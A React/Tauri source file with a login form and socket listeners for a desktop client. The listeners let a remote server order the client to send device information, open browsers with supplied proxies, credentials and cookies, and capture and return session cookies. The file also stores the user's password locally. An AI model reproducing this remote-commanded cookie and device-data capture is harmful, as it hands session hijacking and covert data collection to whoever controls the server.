import { useState, useEffect } from "react";
import { invoke } from "@tauri-apps/api/core";
import { connectSocket, emitSecure, listen, sendHandshake } from "../services/socket";
import { showToast } from "./Toast";
import { useI18n, getT } from "../i18n/I18nContext";

interface LoginProps {
  onLoginSuccess: (token: string, userId: string) => void;
}

export default function Login({ onLoginSuccess }: LoginProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [focused, setFocused] = useState<string | null>(null);
  const { t } = useI18n();

  useEffect(() => {
    invoke<{ email: string; password: string } | null>("load_credentials").then((creds) => {
      if (creds) {
        setEmail(creds.email);
        setPassword(creds.password);
      }
    }).catch(() => {});
  }, []);

  async function handleLogin() {
    if (!email || !password) {
      showToast(t("login.warning"), t("login.emptyFields"));
      return;
    }

    setLoading(true);
    try {
      const result = await connectSocket(email, password);

      await invoke("save_session", { token: result.token, userId: result.userId });
      await invoke("save_credentials", { email, password });

      initializeSocketListeners(onLoginSuccess);

      listen("downloadStatus", (data: { packages: any[] }) => {
        console.log("[socket] Download status received:", data.packages?.length, "packages");
      });

      await sendHandshake("login");

      showToast(t("login.success"), t("login.connectionActive"));
      onLoginSuccess(result.token, result.userId);
    } catch (error: any) {
      let msg = typeof error === "string" ? error : error?.message || t("login.checkDetails");
      msg = msg.replace(/^Error invoking remote method.*?:\s*/i, "").replace(/^Error:\s*/i, "").trim();

      const lower = msg.toLowerCase();
      if (lower.includes("incorrect login") || lower.includes("invalid credentials")) {
        msg = t("login.incorrectCreds");
      } else if (lower.startsWith("connection error")) {
        msg = t("login.serverError");
      }

      showToast(t("login.error"), msg);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="glass-card card-enter">
      <div className="card-accent" />

      <div className="card-body">
        <div className="form-stack">
          <div className={`input-group ${focused === "email" ? "active" : ""}`}>
            <label className="input-label">{t("login.email")}</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onFocus={() => setFocused("email")}
              onBlur={() => setFocused(null)}
              onKeyDown={(e) => e.key === "Enter" && handleLogin()}
              placeholder={t("login.emailPlaceholder")}
            />
          </div>

          <div className={`input-group ${focused === "password" ? "active" : ""}`}>
            <label className="input-label">{t("login.password")}</label>
            <div className="input-row">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setFocused("password")}
                onBlur={() => setFocused(null)}
                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                placeholder={t("login.passwordPlaceholder")}
              />
              <button
                className="toggle-vis"
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                tabIndex={-1}
              >
                {showPassword ? (
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                ) : (
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                )}
              </button>
            </div>
          </div>

          <p className="form-note">{t("login.note")}</p>

          <button
            className={`btn-primary ${loading ? "loading" : ""}`}
            onClick={handleLogin}
            disabled={loading}
          >
            {loading ? (
              <span className="btn-loader" />
            ) : (
              <>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
                <span>{t("login.connect")}</span>
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
}

export function initializeSocketListeners(onLogout: (() => void) | ((token: string, userId: string) => void)) {
  listen("connect", async () => {
    await sendHandshake("reconnect");
  });

  listen("authError", (data: { message?: string }) => {
    const t = getT();
    showToast(t("session.error"), data?.message || t("session.invalidMsg"));
    invoke("delete_session").catch(() => {});
    if (typeof onLogout === "function") (onLogout as any)();
  });

  listen("deviceLimitExceeded", () => {
    const t = getT();
    showToast(t("login.warning"), t("session.deviceLimit"));
  });

  listen("islemyap", async (data: any) => {
    console.log("[socket] islemyap event received:", JSON.stringify(data));
    const t = getT();
    if (data.action === "ApplicationData") {
      const deviceInfo = await invoke("get_device_info");
      emitSecure("deviceCaptured", {
        status: "success",
        message: "Data transmitted",
        data: deviceInfo,
      });
    } else if (data.action === "launchBrowser") {
      showToast(t("task.new"), t("task.openingBrowser"));
      emitSecure("puppeteerLog", { type: "info", message: "Browser açılıyor..." });
      try {
        await invoke("launch_browser", {
          url: data.url,
          proxy: data.proxy || null,
          headless: data.headless || false,
          userAgent: data.userAgent || null,
          username: data.username || null,
          password: data.password || null,
          cookies: data.cookies || null,
          puppeterConfig: data.puppeterConfig || null,
        });
        showToast(t("task.new"), "Browser opened");
        emitSecure("puppeteerLog", { type: "success", message: "Browser başarıyla açıldı" });
      } catch (err: any) {
        console.error("Browser launch failed:", err);
        showToast(t("login.error"), err?.message || String(err));
        emitSecure("puppeteerLog", { type: "error", message: `Browser açılamadı: ${err?.message || String(err)}` });
      }
    } else if (data.action === "launchBrowserCookies") {
      showToast(t("task.new"), t("task.openingBrowser"));
      emitSecure("puppeteerLog", { type: "info", message: "Browser cookies ile açılıyor..." });
      try {
        await invoke("launch_browser_cookies", {
          url: data.url,
          proxy: data.proxy || null,
          headless: data.headless || false,
          userAgent: data.userAgent || null,
          username: data.username || null,
          password: data.password || null,
          cookies: data.cookies || null,
          puppeterConfig: data.puppeterConfig || null,
        });
        showToast(t("task.new"), "Browser opened");
        emitSecure("puppeteerLog", { type: "success", message: "Browser cookies ile açıldı" });
      } catch (err: any) {
        console.error("Browser launch failed:", err);
        showToast(t("login.error"), err?.message || String(err));
        emitSecure("puppeteerLog", { type: "error", message: `Browser açılamadı: ${err?.message || String(err)}` });
      }
    } else if (data.action === "getCookies") {
      emitSecure("puppeteerLog", { type: "info", message: "Cookies yakalanıyor..." });
      try {
        const result = await invoke<string | null>("get_browser_cookies");
        if (result) {
          showToast(t("task.new"), "Cookies captured");
          emitSecure("cookiesCaptured", {
            status: "success",
            message: "Cookies captured successfully",
            data: result,
          });
          emitSecure("puppeteerLog", { type: "success", message: "Cookies başarıyla yakalandı" });
        } else {
          showToast(t("login.warning"), "No page found for cookies");
          emitSecure("puppeteerLog", { type: "error", message: "Cookies yakalanamadı: Açık sayfa bulunamadı" });
        }
      } catch (err: any) {
        console.error("Get cookies failed:", err);
        showToast(t("login.error"), err?.message || String(err));
        emitSecure("puppeteerLog", { type: "error", message: `Cookies yakalanamadı: ${err?.message || String(err)}` });
      }
    } else if (data.action === "closeBrowser") {
      emitSecure("puppeteerLog", { type: "info", message: "Browser kapatılıyor..." });
      try {
        await invoke("close_browser");
        showToast(t("task.new"), "Browser closed");
        emitSecure("puppeteerLog", { type: "success", message: "Browser kapatıldı" });
      } catch (err: any) {
        console.error("Close browser failed:", err);
        emitSecure("puppeteerLog", { type: "error", message: `Browser kapatılamadı: ${err?.message || String(err)}` });
      }
    }
  });

  listen("islemyapcustomer", async (data: any) => {
    console.log("[socket] islemyapcustomer event received:", JSON.stringify(data));
    const t = getT();
    if (data.action === "launchBrowser") {
      showToast(t("task.new"), t("task.openingBrowser"));
      try {
        await invoke("launch_browser", {
          url: data.url,
          proxy: data.proxy || null,
          headless: data.headless || false,
          userAgent: data.userAgent || null,
          username: data.username || null,
          password: data.password || null,
          cookies: data.cookies || null,
          puppeterConfig: data.puppeterConfig || null,
        });
      } catch (err: any) {
        console.error("Browser launch failed:", err);
        showToast(t("login.error"), err?.message || String(err));
      }
    } else if (data.action === "launchBrowserCookies") {
      showToast(t("task.new"), t("task.openingBrowser"));
      try {
        await invoke("launch_browser_cookies", {
          url: data.url,
          proxy: data.proxy || null,
          headless: data.headless || false,
          userAgent: data.userAgent || null,
          username: data.username || null,
          password: data.password || null,
          cookies: data.cookies || null,
          puppeterConfig: data.puppeterConfig || null,
        });
      } catch (err: any) {
        console.error("Browser launch failed:", err);
        showToast(t("login.error"), err?.message || String(err));
      }
    } else if (data.action === "getCookies") {
      try {
        const result = await invoke<string | null>("get_browser_cookies");
        if (result) {
          emitSecure("cookiesCaptured", {
            status: "success",
            message: "Cookies captured successfully",
            data: result,
          });
        }
      } catch (err: any) {
        console.error("Get cookies failed:", err);
      }
    } else if (data.action === "closeBrowser") {
      try {
        await invoke("close_browser");
      } catch (err: any) {
        console.error("Close browser failed:", err);
      }
    }
  });
}
